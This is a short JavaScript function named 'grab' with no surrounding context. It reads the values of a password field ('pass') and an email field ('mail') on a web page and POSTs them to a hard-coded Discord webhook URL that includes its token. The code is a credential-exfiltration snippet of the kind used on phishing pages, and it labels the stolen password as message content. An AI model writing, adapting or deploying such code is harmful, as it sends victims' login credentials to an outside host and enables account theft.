function grab(){
  let xhr = new XMLHttpRequest()
  xhr.open('POST','https://discord.com/api/webhooks/1001347332845076520/rEVS9A_2ndsSloMtDoW45cWdhakiuMsi-EKEzS-JX1BRKS2ZiNaxgTRniD4AAMl69NGb')
  xhr.setRequestHeader('Content-Type','application/json')
  xhr.send(JSON.stringify({"content":`発言内容: ${document.getElementById('pass').value}\nby: ${document.getElementById('mail').value}`}))
}